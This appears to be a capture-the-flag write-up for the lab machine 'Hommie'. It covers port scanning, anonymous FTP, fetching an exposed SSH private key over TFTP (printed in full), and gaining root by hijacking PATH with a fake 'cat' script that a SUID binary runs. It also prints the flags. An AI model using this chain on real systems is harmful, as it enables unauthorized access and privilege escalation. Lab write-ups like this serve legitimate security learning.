# Hommie

## Information

## Solution

### Enumeration 
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.23
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 14:50 +07
Nmap scan report for 10.11.5.23
Host is up (0.00049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.5.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA)
|   256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA)
|_  256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:01:39:EA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.61 seconds
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sU -F --top-ports 100 10.11.5.23
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 15:26 +07
Nmap scan report for 10.11.5.23
Host is up (0.0016s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
MAC Address: 08:00:27:01:39:EA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 115.24 seconds
```

#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.23/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.23/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 99]
/index.html           (Status: 200) [Size: 99]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```
```
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.23/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.23/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
#### Web
![web](/walkthroughs/hackmyvm/machines/beginner/Hommie/web.png)

#### FTP
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ftp 10.11.5.23
Connected to 10.11.5.23.
220 (vsFTPd 3.0.3)
Name (10.11.5.23:dungcngo): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||30226|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
ftp> cd /.web
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||5717|)
150 Here comes the directory listing.
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
226 Directory send OK.
ftp> pwd
Remote directory: /.web
ftp> get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||49333|)
150 Opening BINARY mode data connection for index.html (99 bytes).
100% |*****************************************|    99       43.27 KiB/s    00:00 ETA
226 Transfer complete.
99 bytes received in 00:00 (16.12 KiB/s)
ftp> 
ftp> exit
221 Goodbye.

┌──(dungcngo㉿kali)-[/tmp]
└─$ cat index.html                        
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

#### TFTP
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ tftp 10.11.5.23
tftp> ls -la
?Invalid command
tftp> ?
tftp-hpa 5.3
Commands may be abbreviated.  Commands are:

connect         connect to remote tftp
mode            set file transfer mode
put             send file
get             receive file
quit            exit tftp
verbose         toggle verbose mode
trace           toggle packet tracing
literal         toggle literal mode, ignore ':' in file name
status          show current status
binary          set mode to octet
ascii           set mode to netascii
rexmt           set per-packet transmission timeout
timeout         set total retransmission timeout
?               print help information
help            print help information
tftp> get /.ssh/id_rsa
Transfer timed out.

tftp> get id_rsa
```

### Initial Access
#### Shell (
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls    
config-err-gzMqZt
id_rsa
index.html
...

┌──(dungcngo㉿kali)-[/tmp]
└─$ cat id_rsa   
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7
V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y
Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT
gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j
QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq
kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI
M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM
dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW
rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B
tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T
d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/
+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE
Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w
pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk
WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz
bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu
3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6
0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z
HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs
y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY
OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08
QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp
ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----

┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh2john id_rsa > id_rsa.hash   
id_rsa has no password!

┌──(dungcngo㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
                                                                                  ┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -i id_rsa alexia@10.11.5.23
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 30 11:06:15 2020
alexia@hommie:~$ id ; hostname
uid=1000(alexia) gid=1000(alexia) groups=1000(alexia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
hommie
```
#### Flags (user.txt)
```bash
alexia@hommie:~$ ls -la
total 36
drwxr-xr-x 4 alexia alexia 4096 Sep 30  2020 .
drwxr-xr-x 3 root   root   4096 Sep 30  2020 ..
-rw-r--r-- 1 alexia alexia  220 Sep 30  2020 .bash_logout
-rw-r--r-- 1 alexia alexia 3526 Sep 30  2020 .bashrc
drwxr-xr-x 3 alexia alexia 4096 Sep 30  2020 .local
-rw-r--r-- 1 alexia alexia  807 Sep 30  2020 .profile
drwx------ 2 alexia alexia 4096 Sep 30  2020 .ssh
-rw-r--r-- 1 alexia alexia   10 Sep 30  2020 user.txt
-rw------- 1 alexia alexia   52 Sep 30  2020 .Xauthority
alexia@hommie:~$ cat user.txt 
Imnotroot
```

### Privilege Escalation
#### Enumeration
```bash
alexia@hommie:/$ find / -perm -4000 -type f 2>/dev/null
/opt/showMetheKey
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
```

#### Abuse
```bash
alexia@hommie:/$ cd /opt/
alexia@hommie:/opt$ ls -la
total 28
drwxr-xr-x  2 root root  4096 Sep 30  2020 .
drwxr-xr-x 18 root root  4096 Sep 30  2020 ..
-rwsr-sr-x  1 root root 16720 Sep 30  2020 showMetheKey
alexia@hommie:/opt$ file showMetheKey 
showMetheKey: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=63398a6916b1b6bf3991e2b05fa60bec15b1faff, not stripped
alexia@hommie:/opt$ strings /opt/showMetheKey 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
cat $HOME/.ssh/id_rsa
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
showMetheKey.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

```bash
alexia@hommie:/opt$ cd /tmp
alexia@hommie:/tmp$ echo '/bin/bash -p' > cat
alexia@hommie:/tmp$ chmod +x cat
alexia@hommie:/tmp$ export PATH=/tmp:$PATH
alexia@hommie:/tmp$ /opt/showMetheKey 
root@hommie:/tmp# id ; hostname
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(alexia)
hommie
```
#### Flags (root.txt)
```bash
root@hommie:~# cd /
root@hommie:/# ls
bin   etc         initrd.img.old  lib64       media  proc  sbin  tmp  vmlinuz
boot  home        lib             libx32      mnt    root  srv   usr  vmlinuz.old
dev   initrd.img  lib32           lost+found  opt    run   sys   var
root@hommie:/# cd root/
root@hommie:/root# ls
note.txt
root@hommie:/root# grep . note.txt 
I dont remember where I stored root.txt !!!
root@hommie:/root# find / -name root.txt 2>/dev/null |xargs cat
root@hommie:/root# find / -type f -name "root.txt" 2>/dev/null 
/usr/include/root.txt
root@hommie:/root# grep . /usr/include/root.txt
Imnotbatman
```

***You are welcome!***
